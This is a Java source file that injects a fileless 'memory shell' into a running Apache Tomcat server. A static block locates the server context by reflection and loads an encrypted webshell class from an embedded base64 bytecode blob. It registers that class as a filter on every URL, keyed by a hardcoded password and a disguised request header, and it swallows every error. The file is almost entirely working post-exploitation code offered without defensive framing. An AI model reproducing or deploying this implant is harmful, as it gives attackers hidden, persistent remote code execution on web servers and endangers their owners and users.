package core.memshell;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class TomcatFilterMemShell {
    public static Object STANDARD_CONTEXT;
    public static Object RESPONSE;

    public TomcatFilterMemShell() {
        try {
            if (STANDARD_CONTEXT == null) {
                getStandardContext();
                getStandardContext1();
            }
            IMC();
            if (STANDARD_CONTEXT != null) {
                IMF();
            }
        } catch (Exception e) {

        }
    }

    private static synchronized void IMF() {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();

        try {
            String filterName = "memshell.TomcatFilterShell";
            Object filter = (Object) Thread.currentThread().getContextClassLoader().loadClass(filterName).newInstance();
            Class<?> Context = null;
            try {
                Context = classLoader.loadClass("org.apache.catalina.Context"); //
            } catch (Exception e) {
            }
            Class<?> FilterDefClass = null;
            try {
                FilterDefClass = classLoader.loadClass("org.apache.catalina.deploy.FilterDef"); // 6 7
            } catch (Exception e) {
                FilterDefClass = classLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterDef"); // 8 9
            }
            Constructor FilterDefCons = FilterDefClass.getDeclaredConstructor();
            FilterDefCons.setAccessible(true);
            Object filterDef = FilterDefCons.newInstance();
            invoke(filterDef, "setFilterName", filterName);
            invoke(filterDef, "setFilterClass", filter.getClass().getName());
            invoke(STANDARD_CONTEXT, "addFilterDef", filterDef);

            Class<?> filterMapClass = null;
            try {
                filterMapClass = classLoader.loadClass("org.apache.catalina.deploy.FilterMap"); // 6 7
            } catch (Exception e) {
                filterMapClass = classLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterMap"); // 8 9
            }
            Constructor FilterMapCons = filterMapClass.getDeclaredConstructor();
            FilterMapCons.setAccessible(true);
            Object FilterMapObj = FilterMapCons.newInstance();
            invoke(FilterMapObj, "addURLPattern", "/*");
            invoke(FilterMapObj, "setFilterName", filterName);
            invoke(STANDARD_CONTEXT, "addFilterMap", FilterMapObj);

            Class<?> ApplicationFilterConfigClass = classLoader.loadClass("org.apache.catalina.core.ApplicationFilterConfig");
            Constructor ApplicationFilterCons = ApplicationFilterConfigClass.getDeclaredConstructor(Context, FilterDefClass);
            ApplicationFilterCons.setAccessible(true);
            Object ApplicationfilterObj = ApplicationFilterCons.newInstance(STANDARD_CONTEXT, filterDef);

            // https://www.cnblogs.com/yyhuni/p/shiroMemshell.html#1%E4%BB%8Epost%E8%AF%B7%E6%B1%82%E4%BD%93%E4%B8%AD%E5%8F%91%E9%80%81%E5%AD%97%E8%8A%82%E7%A0%81%E6%95%B0%E6%8D%AE
            Field getAppFilterConfigs =null;
            try{
                getAppFilterConfigs = STANDARD_CONTEXT.getClass().getSuperclass().getDeclaredField("filterConfigs");
            }catch (Exception e){
                getAppFilterConfigs = STANDARD_CONTEXT.getClass().getDeclaredField("filterConfigs");
            }

            getAppFilterConfigs.setAccessible(true);
            Map filterConfigs = (Map) getAppFilterConfigs.get(STANDARD_CONTEXT);
            filterConfigs.put(filterName, ApplicationfilterObj);

        } catch (Throwable var16) {

        }

    }

    private static Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    private static Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object) null);
                    }
                }
            }

            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) ((Class[]) classes.toArray(new Class[0])));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public static synchronized void getStandardContext() throws Exception {
        boolean var0 = false;
        Thread[] var1 = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads"));

        for (int var2 = 0; var2 < var1.length; ++var2) {
            Thread var3 = var1[var2];
            if (var3 != null) {
                String var4 = var3.getName();
//                if (!var4.contains("exec") && var4.contains("http")) {
                try {
                    if (var4.startsWith("http")) {
                        Object var5 = getFV(var3, "target");
                        if (var5 instanceof Runnable) {
                            Object var6;
                            try {
                                var6 = getFV(getFV(getFV(var5, "this$0"), "handler"), "global");
                            } catch (Exception var17) {
                                continue;
                            }

                            List var7 = (List) getFV(var6, "processors");

                            for (int var8 = 0; var8 < var7.size(); ++var8) {
                                Object var9 = getFV(var7.get(var8), "req");
                                RESPONSE = var9.getClass().getMethod("getResponse", (Class[]) (new Class[0])).invoke(var9);

                                Object var10 = var9.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(var9, 1);

                                try {
                                    Field var11 = var10.getClass().getDeclaredField("context");
                                    var11.setAccessible(true);
                                    STANDARD_CONTEXT = var11.get(var10);
                                } catch (Exception var16) {
                                    Object var12 = var10.getClass().getDeclaredMethod("getServletContext").invoke(var10);
                                    Field var13 = var12.getClass().getDeclaredField("context");
                                    var13.setAccessible(true);
                                    Object var14 = var13.get(var12);
                                    Field var15 = var14.getClass().getDeclaredField("context");
                                    var15.setAccessible(true);
                                    STANDARD_CONTEXT = var15.get(var14);
                                }
                                if (STANDARD_CONTEXT != null) {
                                    var0 = true;
                                    break;
                                }

                            }

                            if (var0) {
                                break;
                            }
                        }
                    }
                } catch (Exception e) {
                }
            }
        }

    }

    private void getStandardContext1() {
        try {
            Object request = Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getRequest").invoke(null);
            Object servletContext = invokeMethod(request, "getServletContext");
            STANDARD_CONTEXT =  getFV(getFV(servletContext,"context"), "context");
        } catch (Exception e) {
        }
    }

    private Object invokeMethod(Object obj,String methodName,Object... parameters){
        try {
            ArrayList classes = new ArrayList();
            if (parameters!=null){
                for (int i=0;i<parameters.length;i++){
                    Object o1=parameters[i];
                    if (o1!=null){
                        classes.add(o1.getClass());
                    }else{
                        classes.add(null);
                    }
                }
            }
            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));

            return method.invoke(obj, parameters);
        }catch (Exception e){
//        	e.printStackTrace();
        }
        return null;
    }

    public static synchronized void IMC() {
        try {
            Thread.currentThread().getContextClassLoader().loadClass("memshell.TomcatFilterShell");
        } catch (Exception var4) {
            try {
                Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                var1.setAccessible(true);
                byte[] var2 = base64Decode("yv66vgAAADMBTgcAsQkARgCyBwCzCgADALQKAAMAtQkARgC2CgADALcKAEYAuAkARgC5CAC6CQBGALsHALwJAEYAvQkARgC+CQBGAL8KAMAAwQoAWwC0CADCCADDCADECgBbAMUKAFsAxggAxwoAyADJBwDKCgABAMsKABkAzAoAyADNCgDIAM4HAM8IANAKANEA0goAAQDTCgDRANQHANUKANEA1goAIwDXCgAjANgKAAEA2QgA2goAMQDbCADcBwDdCgAxAN4HAN8KAOAA4QoADADiCADjBwDkBwB6CADlCgAxAOYIAOcIAOgIAOkIAOoIAOsHAOwHAO0IAO4LADoA7wgA8AoAAQDxCwA6APILADoA8woARgD0CgBGAPUIAPYLAPcA+AcA+QoAMQD6CgBGAMUKAEYA+wsA9wD8CAD9CwA6APwHAP4KAE0AtAoADAD/CwA7AQAKAAEBAQoBAgEDCgAMALcKAE0BBAoARgEFCgABAQYIAQcIAQgLAQkBCgoAHgELBwEMBwENAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMbWVtc2hlbGwvVG9tY2F0RmlsdGVyU2hlbGw7AQABbwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEACGhhc2hDb2RlAQADKClJAQAGPGluaXQ+AQADKClWAQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwD5BwEOBwDPAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcAsQEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBDwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwcBEAcBEQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAWVG9tY2F0RmlsdGVyU2hlbGwuamF2YQEAEGphdmEvbGFuZy9TdHJpbmcMAGMAYgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAByAHMMARIBEwwAYQBiDAEUARUMAGUAiAwAZQBiAQAFVVRGLTgMAGYAYgEAEGphdmEvbGFuZy9PYmplY3QMAF0AXgwAXwBgDABkAGIHARYMARcBGAEAEDNjNmUwYjhhOWMxNTIyNGEBAARwQVMzAQAQL2Zhdmljb25kZW1vLmljbwwAcgB0DAEZARoBAANBRVMHAQ4MARsBHAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAR0BHgwAcgEfDACYASAMASEBIgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHASMMARsBJAwBJQBxDAEmAScBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBKAEeDAByASkMARQBKgwBKwEVAQAQamF2YS51dGlsLkJhc2U2NAwBLAEtAQAKZ2V0RW5jb2RlcgEAEltMamF2YS9sYW5nL0NsYXNzOwwBLgEvAQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBMAwBMQEyDAEzATQBAA5lbmNvZGVUb1N0cmluZwEAD2phdmEvbGFuZy9DbGFzcwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMATUBNgEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBNwCIAQAOWE1MSFRUUFJlcXVlc3QMATgBOQwBOgE7DAE8AIgMAJUAlgwAewB8AQAQbWVtc2hlbGwucGF5bG9hZAcBEAwBPQE+AQAabWVtc2hlbGwvVG9tY2F0RmlsdGVyU2hlbGwMAT8BQAwAdwB4DAFBAUIBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAGcAaAwBQwFEDAFFAUYHAUcMAUgBSQwBSgEeDACMAI0MAUUBKgEADlhtbEhUVFBSZXF1ZXN0AQAHU3VjY2VzcwcBSwwAnQFMDAFNAHMBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAE2phdmF4L2NyeXB0by9DaXBoZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvdXRpbC9PYmplY3RzAQAEaGFzaAEAFihbTGphdmEvbGFuZy9PYmplY3Q7KUkBAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAlnZXRIZWFkZXIBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAKZ2V0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");
                var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);
            } catch (Throwable var3) {
            }
        }

    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

    static {
        new TomcatFilterMemShell();
    }
}
